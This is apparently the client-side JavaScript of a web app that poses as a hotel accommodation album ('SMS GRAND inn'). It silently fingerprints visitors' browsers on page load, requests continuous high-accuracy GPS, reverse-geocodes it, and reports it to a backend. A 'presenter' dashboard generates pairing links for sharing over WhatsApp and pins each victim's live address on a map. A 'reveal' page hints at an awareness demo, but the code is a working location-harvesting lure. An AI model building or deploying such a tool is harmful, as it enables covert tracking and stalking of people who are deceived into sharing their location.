// Global State
let revealMapInstance = null;
let presenterMapInstance = null;
let currentLocationData = {
  lat: null,
  lng: null,
  accuracy: null,
  address: 'Permission Denied / Unresolved'
};
let presenterWs = null;
let countdownInterval = null;

let visitReported = false;
let locationReported = false;

function reportVisit() {
  if (visitReported) return;
  const hash = window.location.hash || '#/lure';
  if (hash.includes('presenter')) return;

  visitReported = true;
  const fingerprint = getBrowserFingerprint();
  fetch('/api/visit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ fingerprint })
  }).catch(err => console.error('Failed to report visit:', err));
}

function reportLocation(location) {
  fetch('/api/location', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ location })
  }).catch(err => console.error('Failed to report location:', err));
}

let autoPairingCode = null;

function getQueryParam(name) {
  const searchParams = new URLSearchParams(window.location.search);
  if (searchParams.has(name)) {
    return searchParams.get(name);
  }
  const hash = window.location.hash;
  if (hash.includes('?')) {
    const hashParams = new URLSearchParams(hash.split('?')[1]);
    if (hashParams.has(name)) {
      return hashParams.get(name);
    }
  }
  return null;
}

function updateVisitorWhatsAppLinks() {
  const whatsappBtns = [
    document.getElementById('btn-consent-share-whatsapp'),
    document.getElementById('btn-lure-share-whatsapp')
  ];
  
  const currentUrl = window.location.href;
  const shareText = `Check out SMS GRAND inn accommodation details: ${currentUrl}`;
  const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
  
  whatsappBtns.forEach(btn => {
    if (btn) {
      btn.href = whatsappUrl;
    }
  });
}

// Helpers to extract browser fingerprint details (for security alert)
function getGPU() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'Unknown GPU';
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (!debugInfo) return 'Unknown GPU';
    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  } catch (e) {
    return 'Unknown GPU';
  }
}

function getBrowserFingerprint() {
  const ua = navigator.userAgent;
  const screenRes = `${window.screen.width}x${window.screen.height}`;
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Timezone';
  const language = navigator.language || 'Unknown';
  const cpuCores = navigator.hardwareConcurrency || 'Unknown';
  const gpu = getGPU();
  
  let os = 'Unknown OS';
  if (ua.indexOf('Win') !== -1) os = 'Windows';
  else if (ua.indexOf('Mac') !== -1) os = 'macOS';
  else if (ua.indexOf('Linux') !== -1) os = 'Linux';
  else if (ua.indexOf('Android') !== -1) os = 'Android';
  else if (ua.indexOf('like Mac') !== -1) os = 'iOS';
  
  let browser = 'Unknown Browser';
  if (ua.indexOf('Chrome') !== -1) browser = 'Chrome';
  else if (ua.indexOf('Safari') !== -1) browser = 'Safari';
  else if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
  else if (ua.indexOf('Edge') !== -1) browser = 'Edge';
  
  return { os, browser, screenRes, timeZone, language, cpuCores, gpu, rawUa: ua };
}

// Router for SPA navigation
function router() {
  const hash = window.location.hash || '#/lure';
  
  // Hide all views
  document.querySelectorAll('.view').forEach(view => {
    view.classList.remove('active');
  });

  // Reset body background
  document.body.className = '';

  if (hash === '#/lure' || hash === '#/') {
    document.getElementById('lure-view').classList.add('active');
    document.body.classList.add('theme-lure');
  } else if (hash === '#/consent') {
    document.getElementById('consent-view').classList.add('active');
    document.body.classList.add('theme-consent');
  } else if (hash === '#/reveal') {
    document.getElementById('reveal-view').classList.add('active');
    document.body.classList.add('theme-reveal');
    initRevealPage();
  } else if (hash === '#/presenter') {
    document.getElementById('presenter-view').classList.add('active');
    document.body.classList.add('theme-presenter');
    initPresenterMode();
  } else {
    // Fallback to lure
    window.location.hash = '#/lure';
  }
  updateVisitorWhatsAppLinks();
}

// Initialize views on load
window.addEventListener('hashchange', router);
window.addEventListener('DOMContentLoaded', () => {
  router();
  autoPairingCode = getQueryParam('code');
  reportVisit();
  
  // Attach Event Listeners
  document.getElementById('btn-view-album').addEventListener('click', () => {
    window.location.hash = '#/consent';
  });
  
  document.getElementById('btn-consent-continue').addEventListener('click', requestLocation);
  
  document.getElementById('btn-pair-submit').addEventListener('click', submitPairingCode);
  
  document.getElementById('btn-reset-presenter').addEventListener('click', () => {
    // Simply reload to reset presenter socket and code
    window.location.reload();
  });
});

let watchId = null;

// Request Geolocation from browser with watchPosition for higher precision and live updates
function requestLocation() {
  const options = {
    enableHighAccuracy: true, // Force GPS hardware tracking
    timeout: 15000,
    maximumAge: 0
  };

  if (!navigator.geolocation) {
    handleLocationError({ code: 0, message: 'Geolocation not supported by this browser.' });
    return;
  }

  if (watchId) {
    navigator.geolocation.clearWatch(watchId);
  }

  watchId = navigator.geolocation.watchPosition(
    (position) => {
      // SUCCESS
      currentLocationData.lat = position.coords.latitude;
      currentLocationData.lng = position.coords.longitude;
      currentLocationData.accuracy = position.coords.accuracy;
      
      // If we are not on the reveal page yet, redirect
      if (window.location.hash !== '#/reveal') {
        currentLocationData.address = 'Resolving address...';
        reportLocation(currentLocationData);
        window.location.hash = '#/reveal';
      } else {
        // If we are already on the page, trigger another geocoding update to refine it
        geocodeAndUpdate();
      }
    },
    (error) => {
      handleLocationError(error);
    },
    options
  );
}

// Handle permission denial or lookup failures
function handleLocationError(error) {
  console.warn('Geolocation failed:', error);
  currentLocationData.lat = null;
  currentLocationData.lng = null;
  currentLocationData.accuracy = null;
  currentLocationData.address = 'Blocked by User';
  
  if (watchId) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
  }
  
  window.location.hash = '#/reveal';
}

// Reverse geocode coordinates and report them to the backend server
function geocodeAndUpdate() {
  const addressEl = document.getElementById('leaked-address');
  if (currentLocationData.lat === null || currentLocationData.lng === null) return;

  fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${currentLocationData.lat}&lon=${currentLocationData.lng}`)
    .then(res => res.json())
    .then(data => {
      const address = data.display_name || 'Coordinates resolved, address unavailable.';
      currentLocationData.address = address;
      if (addressEl) {
        addressEl.textContent = address;
      }
      reportLocation(currentLocationData);
      if (autoPairingCode) {
        submitPairingCode(autoPairingCode);
      }
    })
    .catch(err => {
      console.error('Nominatim lookup failed:', err);
      const fallbackAddr = `Lat: ${currentLocationData.lat.toFixed(5)}, Lng: ${currentLocationData.lng.toFixed(5)}`;
      currentLocationData.address = fallbackAddr;
      if (addressEl) {
        addressEl.textContent = fallbackAddr;
      }
      reportLocation(currentLocationData);
      if (autoPairingCode) {
        submitPairingCode(autoPairingCode);
      }
    });
}

// Populate the Reveal View
function initRevealPage() {
  const fingerprint = getBrowserFingerprint();
  const addressEl = document.getElementById('leaked-address');
  
  if (currentLocationData.lat !== null && currentLocationData.lng !== null) {
    // LOCATION GRANTED PATH
    if (addressEl) {
      addressEl.textContent = 'Resolving location context...';
    }
    geocodeAndUpdate();
    
    // Enable the pairing box input/button
    const codeInput = document.getElementById('input-pairing-code');
    const pairBtn = document.getElementById('btn-pair-submit');
    if (codeInput) codeInput.disabled = false;
    if (pairBtn) pairBtn.disabled = false;
    
  } else {
    // LOCATION DENIED PATH
    if (addressEl) {
      addressEl.textContent = 'Location access denied. Showing default listing.';
    }
    
    // Disable the pairing box since we have no precise location to mirror
    const codeInput = document.getElementById('input-pairing-code');
    const pairBtn = document.getElementById('btn-pair-submit');
    if (codeInput) {
      codeInput.disabled = true;
      codeInput.placeholder = 'Location Required';
    }
    if (pairBtn) pairBtn.disabled = true;
    reportLocation(currentLocationData);
  }
}

let autoPairCompleted = false;

// Handle Pairing Code Submission (supports optional auto-pairing code)
function submitPairingCode(forcedCode) {
  if (forcedCode && autoPairCompleted) return;
  
  const codeInput = document.getElementById('input-pairing-code');
  const code = (forcedCode || (codeInput ? codeInput.value : '')).trim().replace(/\s/g, '');
  
  if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
    showPairingStatus('Please enter a valid 6-digit code.', 'error');
    return;
  }
  
  if (currentLocationData.lat === null || currentLocationData.lng === null) {
    showPairingStatus('Cannot sync: Geolocation data was not granted.', 'error');
    return;
  }
  
  showPairingStatus('Syncing album...', '');
  
  const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  const wsUrl = `${wsProtocol}//${window.location.host}`;
  const visitorWs = new WebSocket(wsUrl);
  
  visitorWs.onopen = () => {
    visitorWs.send(JSON.stringify({
      type: 'pair_request',
      code: code,
      location: currentLocationData
    }));
  };
  
  visitorWs.onmessage = (event) => {
    try {
      const response = JSON.parse(event.data);
      if (response.type === 'pair_response') {
        if (response.success) {
          showPairingStatus('Album successfully synced with screen!', 'success');
          if (forcedCode) {
            autoPairCompleted = true;
          }
          // Invalidate input
          if (codeInput) {
            codeInput.value = '';
            codeInput.disabled = true;
          }
          const pairSubmitBtn = document.getElementById('btn-pair-submit');
          if (pairSubmitBtn) {
            pairSubmitBtn.disabled = true;
          }
        } else {
          showPairingStatus(response.error || 'Failed to sync. Try again.', 'error');
        }
        visitorWs.close();
      }
    } catch (e) {
      showPairingStatus('Error parsing response from server.', 'error');
      visitorWs.close();
    }
  };
  
  visitorWs.onerror = (err) => {
    showPairingStatus('Failed to connect to relay server.', 'error');
  };
}

function showPairingStatus(text, className) {
  const statusMsg = document.getElementById('pairing-status');
  statusMsg.textContent = text;
  statusMsg.className = 'pairing-status-message ' + className;
}

// Presenter Mode Logic
function initPresenterMode() {
  // Clear any existing socket connection
  if (presenterWs) {
    presenterWs.close();
  }
  
  const setupModeDiv = document.getElementById('presenter-setup-mode');
  const activeModeDiv = document.getElementById('presenter-active-mode');
  const codeDisplay = document.getElementById('presenter-code-display');
  const statusMsg = document.getElementById('presenter-connection-status');
  const timerDisplay = document.getElementById('presenter-timer');
  
  // Show setup view, hide active view
  setupModeDiv.classList.remove('hidden');
  activeModeDiv.classList.add('hidden');
  
  // Render empty/world map for Presenter
  if (presenterMapInstance) {
    presenterMapInstance.remove();
  }
  
  presenterMapInstance = L.map('presenter-map', {
    zoomControl: false,
    attributionControl: false
  }).setView([20, 0], 2); // default zoom out world view
  
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 19
  }).addTo(presenterMapInstance);
  
  L.control.zoom({ position: 'bottomright' }).addTo(presenterMapInstance);
  
  // Setup WebSocket for presenter
  const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  const wsUrl = `${wsProtocol}//${window.location.host}`;
  presenterWs = new WebSocket(wsUrl);
  
  presenterWs.onopen = () => {
    statusMsg.textContent = 'Registering presenter session...';
    presenterWs.send(JSON.stringify({ type: 'init_presenter' }));
  };
  
  presenterWs.onmessage = (event) => {
    try {
      const payload = JSON.parse(event.data);
      
      switch (payload.type) {
        case 'session_created':
          codeDisplay.textContent = formatCode(payload.code);
          statusMsg.textContent = 'Waiting for visitor to mirror screen...';
          startCountdown(payload.expiresIn, timerDisplay, codeDisplay, statusMsg);
          setupShareButtons(payload.code);
          break;
        case 'code_expired':
          handlePresenterCodeExpired(codeDisplay, statusMsg);
          break;
        case 'location_update':
          handlePresenterLocationUpdate(payload.location);
          break;
        case 'error':
          statusMsg.textContent = `Error: ${payload.message}`;
          break;
      }
    } catch (e) {
      console.error('Error handling presenter message:', e);
    }
  };
  
  presenterWs.onclose = () => {
    console.log('Presenter socket closed.');
  };
  
  presenterWs.onerror = (err) => {
    statusMsg.textContent = 'Relay connection error.';
  };
}

function formatCode(code) {
  if (code.length === 6) {
    return `${code.substring(0, 3)} ${code.substring(3)}`;
  }
  return code;
}

function startCountdown(seconds, display, codeDisplay, statusDisplay) {
  clearInterval(countdownInterval);
  let timeRemaining = seconds;
  
  function updateTimer() {
    const minutes = Math.floor(timeRemaining / 60);
    const secs = timeRemaining % 60;
    display.textContent = `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
    
    if (timeRemaining <= 0) {
      clearInterval(countdownInterval);
      handlePresenterCodeExpired(codeDisplay, statusDisplay);
    }
    timeRemaining--;
  }
  
  updateTimer();
  countdownInterval = setInterval(updateTimer, 1000);
}

function handlePresenterCodeExpired(codeDisplay, statusDisplay) {
  clearInterval(countdownInterval);
  codeDisplay.textContent = 'EXPIRED';
  codeDisplay.style.color = '#ff3b30';
  statusDisplay.textContent = 'Code expired. Refresh to generate a new pairing session.';
  document.getElementById('presenter-timer').textContent = '0:00';
  
  const copyBtn = document.getElementById('btn-copy-link');
  const whatsappBtn = document.getElementById('btn-share-whatsapp');
  if (copyBtn) copyBtn.setAttribute('disabled', 'true');
  if (whatsappBtn) whatsappBtn.style.display = 'none';
}

function setupShareButtons(code) {
  const copyBtn = document.getElementById('btn-copy-link');
  const whatsappBtn = document.getElementById('btn-share-whatsapp');
  
  if (!copyBtn || !whatsappBtn) return;
  
  const shareLink = `${window.location.origin}/#/lure?code=${code}`;
  
  // Enable copy button
  copyBtn.removeAttribute('disabled');
  copyBtn.onclick = () => {
    navigator.clipboard.writeText(shareLink).then(() => {
      const originalText = copyBtn.textContent;
      copyBtn.textContent = '✓ Link Copied!';
      setTimeout(() => {
        copyBtn.textContent = originalText;
      }, 2000);
    }).catch(err => {
      console.error('Failed to copy link:', err);
    });
  };
  
  // Set up WhatsApp button
  const shareText = `Hey! Check out SMS GRAND inn accommodation details: ${shareLink}`;
  whatsappBtn.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
  whatsappBtn.style.display = 'inline-flex';
}

function handlePresenterLocationUpdate(location) {
  clearInterval(countdownInterval);
  
  // Transition dashboard to active mode
  document.getElementById('presenter-setup-mode').classList.add('hidden');
  document.getElementById('presenter-active-mode').classList.remove('hidden');
  
  document.getElementById('presenter-visitor-address').textContent = location.address;
  
  // Set View on Presenter Map
  if (presenterMapInstance) {
    presenterMapInstance.setView([location.lat, location.lng], 16);
    
    // Add pulsing warning marker
    const warningIcon = L.divIcon({
      className: 'custom-marker-icon',
      html: `<div style="background-color: #ff3b30; width: 24px; height: 24px; border-radius: 50%; border: 4px solid white; box-shadow: 0 0 15px rgba(255,59,48,1); animation: pulse 1.5s infinite;"></div>`,
      iconSize: [24, 24],
      iconAnchor: [12, 12]
    });
    
    const marker = L.marker([location.lat, location.lng], { icon: warningIcon }).addTo(presenterMapInstance);
    marker.bindPopup(`<b>Visitor Device Pinned</b><br>${location.address}`).openPopup();
  }
}
